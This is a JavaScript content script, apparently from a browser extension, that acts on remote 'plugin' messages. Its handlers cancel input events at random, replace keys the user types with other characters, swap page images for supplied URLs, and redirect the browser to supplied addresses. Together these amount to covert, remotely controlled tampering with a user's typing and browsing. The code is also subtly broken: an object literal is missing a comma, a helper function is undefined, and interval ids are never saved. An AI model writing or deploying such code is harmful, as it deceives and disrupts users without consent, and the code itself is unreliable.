const plugin_action = {
    "Redirect": redirect,
    "Cancel events": register_cancel_events,
    "Randomize keypress": register_randomize_keypress
    "Image exchange": register_image_exchange
}

var registered_listeners = {}
var registered_intervals = {}

function handle_plugin(message) {
    console.log(message);
    if (message.type == "revoke_plugin") {
        return revoke_plugin(message.name);
    }
    
    let data = message.data;
    plugin_action[message.name](data);
}

function revoke_plugin(name) {
    // TODO: Uncomment try catch for final version
    // try {
        if (Array.isArray(registered_listeners[name])){
            for (let event of registered_listeners[name]) {
                document.removeEventListener(event.on, event.function)
            }
            delete registered_listeners[name]
        }
        if (Array.isArray(registered_intervals[name])) {
            for (let interval of registered_intervals[name]) {
                clearInterval(interval.id)
            }
            delete registered_intervals[name]
        }
    // } catch (error) {}
}

function register_randomize_keypress(data) {
    registered_listeners["Randomize keypress"] = [{
        on: "keydown",
        keydata: data.keydata,
        probability: data.probability,
        function: randomize_keypress
    }];
    document.addEventListener("keydown", randomize_keypress);
}

function randomize_keypress(event) {
    if (!registered_listeners["Randomize keypress"][0]) return;

    let element = event.srcElement;
    let event_data = registered_listeners["Randomize keypress"][0];
    let probability = event_data.probability;
    for (let keydatum of Object.entries(event_data.keydata)) {
        if (keydatum[0].split("").includes(event.key) && Math.random() < probability) {
            let replacements = keydatum[1].split("");
            let new_key = replacements[random_index(replacements.length)];
            
            event.preventDefault();

            let value_array = element.value.split("");
            let new_start = element.selectionStart + 1;
            
            element.value = [
                ...value_array.slice(0, element.selectionStart),
                new_key,
                ...value_array.slice(element.selectionEnd)
            ].join("")
            element.selectionStart = new_start;
            element.selectionEnd = new_start;
        }
    }
}

function register_cancel_events(data) {
    registered_listeners["Cancel events"] = [];
    for (let event of Object.entries(data)) {
        registered_listeners["Cancel events"].push({
            on: event[0],
            probability: event[1],
            function: cancel_event
        });
        document.addEventListener(event[0], cancel_event);
    }
}

function cancel_event(event) {
    for (let e of registered_listeners["Cancel events"]) {
        if (event.type != e.on) continue;
        if (Math.random() > e.probability) return;
        event.preventDefault();
        console.log("cancel")
    }
}

function register_image_exchange(data) {
    var image_url = [];
    for (let url_data of Object.entries(data.images)) {
        if (url_data[0] == "*" || location.href.includes(url_data[0])) {
            for (let url of Object.entries(url_data[1])) {
                image_url.push(url[1]);
            }
        }
    }

    registered_intervals["Image exchange"] = [{
        interval: data.interval,
        probability: data.probability,
        amount: data.amount,
        allow_visible: data.allow_visible,
        images: image_url,
        function: image_exchange
    }];

    setInterval(image_exchange, data.interval);
}

function image_exchange() {
    let data = registered_intervals["Image exchange"][0];
    if (Math.random() > data.probability) return;

    //TODO: Change only not visible images

    let images = document.getElementsByTagName("img");
    for (var _ = 0; _ < data.amount; _++) {
        var image_index = Math.floor(Math.random() * images.length);
        var image_url = data.images[Math.floor(Math.random() * data.images.length)]
        images[image_index].setAttribute("src", image_url);
    }
}

function redirect(data) {
    if (!document.hasFocus()) return;
    if (Math.random() > data.probability) return;

    var permitted = [];
    for (var url_data of data.urls) {
        var url_data = Object.entries(url_data)[0];
        if (url_data[0] == "*" || location.href.includes(url_data[0])) {
            permitted.push(url_data[1]);
        }
    }

    setTimeout(() => {
        location.href = permitted[random_index(permitted.length)]
    }, data.delay);
}
